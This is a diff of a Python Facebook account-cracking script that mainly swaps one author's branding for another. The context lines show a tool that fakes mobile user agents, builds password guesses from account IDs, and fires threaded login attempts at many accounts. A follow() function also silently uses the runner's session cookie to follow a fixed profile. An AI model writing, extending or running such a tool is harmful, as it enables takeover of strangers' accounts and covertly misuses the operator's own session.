@@ -1,4 +1,4 @@
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 import os
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
@@ -9,7 +9,7 @@ from datetime import date
 from datetime import datetime
 from time import sleep
 from time import sleep as waktu
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -18,7 +18,7 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
-#__________EHC CYBER 99 MOSABBIR 
+#__________EHC CYBER 99 ALAMIN 
 def cek_apk(session,coki):
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
@@ -44,21 +44,21 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
             print('')
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 def follow(self, session, coki):
         r = BeautifulSoup(session.get('https://mbasic.facebook.com/itz.ongkon.mallik', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://mbasic.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text                      
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.009)
-#__________EHC CYBER 99 MOSABBIR         
+#__________EHC CYBER 99 ALAMIN         
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
@@ -92,21 +92,19 @@ today = date.today()
 os.system('xdg-open https://www.facebook.com/profile.php?id=61551881526860&mibextid=ZbWKwL')
 import os
 os.system("pkg install espeak")
-#__________EHC CYBER 99 MOSABBIR
-print("walcome to SEE MORE EHC CYBER 99 MOSABBIR")
+#__________EHC CYBER 99 ALAMIN
+print("walcome to SEE MORE EHC CYBER 99 ALAMIN")
 logo = ("""
-___  ___                _     _     _       
-|  \/  |               | |   | |   (_)      
-| .  . | ___  ___  __ _| |__ | |__  _ _ __  
-| |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__| 
-| |  | | (_) \__ \ (_| | |_) | |_) | | |    
-\_|  |_/\___/|___/\__,_|_.__/|_.__/|_|_|  """)
+\033[33;1m 88""Yb 88        db     dP""b8 88  dP      dP""b8 Yb  dP 88""Yb 888888 88""Yb 
+\033[33;1m 88__dP 88       dPYb   dP   `" 88odP      dP   `"  YbdP  88__dP 88__   88__dP 
+\033[33;1m 88""Yb 88  .o  dP__Yb  Yb      88"Yb      Yb        8P   88""Yb 88""   88"Yb  
+\033[33;1m 88oodP 88ood8 dP""""Yb  YboodP 88  Yb      YboodP  dP    88oodP 888888 88  Yb """)
 def linex():
 	print('\033[38;5;46m══════════════════════════════════')
 loop = 0
 oks = []
 cps = []
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 def clear():
     os.system('clear')
     print(logo)
@@ -119,7 +117,7 @@ if ltx > 12:
 else:
     a = ltx
     tag = "AM" 
-#__________EHC CYBER 99 MOSABBIR    
+#__________EHC CYBER 99 ALAMIN    
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
     v = 5.2
@@ -129,16 +127,16 @@ try:
         os.system('clear')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 def dynamic(text):
     titik = ['.   ','..  ','... ','.... ']
     for o in titik:
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 ugen2=[]
 ugen=[]
- #__________EHC CYBER 99 MOSABBIR
+ #__________EHC CYBER 99 ALAMIN
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -154,38 +152,38 @@ for xd in range(10000):
     l='Mobile Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)  
-#__________EHC CYBER 99 MOSABBIR
+#__________EHC CYBER 99 ALAMIN
 def samiya(uid):
     if len(uid)==15:
-        if uid[:10] in ['1000000000']       :MOSABBIR = ' (*-*) 2009'
-        elif uid[:9] in ['100000000']       :MOSABBIR = '√ 2009'
-        elif uid[:8] in ['10000000']        :MOSABBIR = '√ 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:MOSABBIR = '√ 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:MOSABBIR = ' 2010'
-        elif uid[:6] in ['100001']          :MOSABBIR = '√ 2010/2011'
-        elif uid[:6] in ['100002','100003'] :MOSABBIR = '√ 2011/2012'
-        elif uid[:6] in ['100004']          :MOSABBIR = '√ 2012/2013'
-        elif uid[:6] in ['100005','100006'] :MOSABBIR = '√ 2013/2014'
-        elif uid[:6] in ['100007','100008'] :MOSABBIR = '√ 2014/2015'
-        elif uid[:6] in ['100009']          :MOSABBIR = '√ 2015'
-        elif uid[:5] in ['10001']           :MOSABBIR = '√ 2015/2016'
-        elif uid[:5] in ['10002']           :MOSABBIR = '√ 2016/2017'
-        elif uid[:5] in ['10003']           :MOSABBIR = '√ 2018/2019'
-        elif uid[:5] in ['10004']           :MOSABBIR = '√ 2019/2020'
-        elif uid[:5] in ['10005']           :MOSABBIR = '√ 2020'
-        elif uid[:5] in ['10006','10007','']:MOSABBIR = '√ 2021'
-        elif uid[:5] in ['10008']           :MOSABBIR = '√ 2022'
-        elif uid[:5] in ['10009']           :MOSABBIR = '√ 2023'
-        else:MOSABBIR=''
+        if uid[:10] in ['1000000000']       :ALAMIN = ' (*-*) 2009'
+        elif uid[:9] in ['100000000']       :ALAMIN = '√ 2009'
+        elif uid[:8] in ['10000000']        :ALAMIN = '√ 2009'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ALAMIN = '√ 2009'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:ALAMIN = ' 2010'
+        elif uid[:6] in ['100001']          :ALAMIN = '√ 2010/2011'
+        elif uid[:6] in ['100002','100003'] :ALAMIN = '√ 2011/2012'
+        elif uid[:6] in ['100004']          :ALAMIN = '√ 2012/2013'
+        elif uid[:6] in ['100005','100006'] :ALAMIN = '√ 2013/2014'
+        elif uid[:6] in ['100007','100008'] :ALAMIN = '√ 2014/2015'
+        elif uid[:6] in ['100009']          :ALAMIN = '√ 2015'
+        elif uid[:5] in ['10001']           :ALAMIN = '√ 2015/2016'
+        elif uid[:5] in ['10002']           :ALAMIN = '√ 2016/2017'
+        elif uid[:5] in ['10003']           :ALAMIN = '√ 2018/2019'
+        elif uid[:5] in ['10004']           :ALAMIN = '√ 2019/2020'
+        elif uid[:5] in ['10005']           :ALAMIN = '√ 2020'
+        elif uid[:5] in ['10006','10007','']:ALAMIN = '√ 2021'
+        elif uid[:5] in ['10008']           :ALAMIN = '√ 2022'
+        elif uid[:5] in ['10009']           :ALAMIN = '√ 2023'
+        else:ALAMIN=''
     elif len(uid) in [9,10]:
-        MOSABBIR = ' √ 2008/2009'
+        ALAMIN = ' √ 2008/2009'
     elif len(uid)==8:
-        MOSABBIR = '√ 2007/2008'
+        ALAMIN = '√ 2007/2008'
     elif len(uid)==7:
-        MOSABBIR = '√ 2006/2007'
-    else:MOSABBIR=''
-    return MOSABBIR
-#__________EHC CYBER 99 MOSABBIR
+        ALAMIN = '√ 2006/2007'
+    else:ALAMIN=''
+    return ALAMIN
+#__________EHC CYBER 99 ALAMIN
 def xxr():
     user=[]
     twf =[]
@@ -214,23 +212,23 @@ def xxr():
     os.system("clear")
     print(logo)
     passx = 0
-    MOSABBIR = []
+    ALAMIN = []
     print("")
     for bilal in range(passx):
         pww = input(f"\033[1;91m[\033[1;97m✅\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
-        MOSABBIR.append(pww)
+        ALAMIN.append(pww)
     with ThreadPool(max_workers=70) as manshera:
         clear()
         tl = str(len(user))
         print('\033[38;5;46m══════════════════════════════════')
-        print('\033[38;5;46m 𝗖𝗬𝗕𝗘𝗥 MOSABBIR')
+        print('\033[38;5;46m 𝗖𝗬𝗕𝗘𝗥 ALAMIN')
         print('\033[38;5;46m══════════════════════════════════')
         print(f' \033[1;91m[\033[1;97m✅\033[1;91m]\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿:\033[38;5;46m {xr}'+tl)
         print('\033[38;5;46m══════════════════════════════════')              
         for love in user:
             pwx = [love[1:]]
             uid = code+love
-            for Eman in MOSABBIR:
+            for Eman in ALAMIN:
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
@@ -306,7 +304,7 @@ def rcrack(uid,pwx,tl):
                 continue
         loop+=1
 #______𝑬𝑴𝑶𝑱𝑰-𝑪𝑹𝑲-𝑺𝒀𝑺𝑻𝑬𝑴👇👇👇👇 
-        brand=random.choice(['NIRJON NAHUEL ','MOSABBIR-CYBER ','MOSABBIR CRACK '])
+        brand=random.choice(['NIRJON NAHUEL ','ALAMIN-CYBER ','ALAMIN CRACK '])
         colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
